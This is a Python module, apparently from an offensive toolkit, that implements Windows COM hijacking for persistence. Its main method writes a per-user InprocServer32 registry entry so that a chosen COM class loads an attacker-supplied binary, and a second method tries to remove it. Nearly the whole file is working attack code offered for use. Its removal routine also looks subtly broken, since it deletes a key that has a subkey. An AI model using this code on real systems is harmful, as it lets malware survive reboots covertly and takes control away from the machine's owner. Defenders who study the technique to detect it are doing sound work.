#!/usr/bin/env python3
"""
COM hijacking persistence module.
Uses COM registration to achieve persistence.
"""

import os
import platform
from typing import Optional


class COMHijacking:
    """
    Hijack COM objects for persistence.
    """

    def __init__(self):
        self.is_windows = platform.system() == "Windows"

    def create_hijack(self,
                     clsid: str,
                     executable_path: str) -> bool:
        """
        Create COM hijack for specified CLSID.
        """
        if not self.is_windows:
            return False

        try:
            import winreg

            # Open CLSID key
            key_path = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"

            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValue(key, "", winreg.REG_SZ, executable_path)
            winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
            winreg.CloseKey(key)

            return True

        except Exception:
            return False

    def remove_hijack(self, clsid: str) -> bool:
        """Remove COM hijack."""
        try:
            import winreg

            key_path = f"Software\\Classes\\CLSID\\{clsid}"
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            return True

        except Exception:
            return False


if __name__ == "__main__":
    print("COM Hijacking Persistence")
    print("=" * 60)

    com = COMHijacking()
    print(f"[*] Windows platform: {com.is_windows}")
